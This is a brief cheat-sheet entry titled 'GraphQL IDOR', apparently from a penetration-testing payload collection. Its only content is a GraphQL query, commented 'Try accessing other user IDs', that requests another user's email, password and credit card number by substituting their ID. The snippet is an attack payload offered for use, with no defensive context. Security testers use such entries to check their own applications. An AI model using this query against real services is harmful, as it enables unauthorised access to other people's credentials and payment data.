# GraphQL IDOR

```graphql
# Try accessing other user IDs
query {
  user(id: "OTHER_USER_ID") {
    email
    password
    creditCard
  }
}
```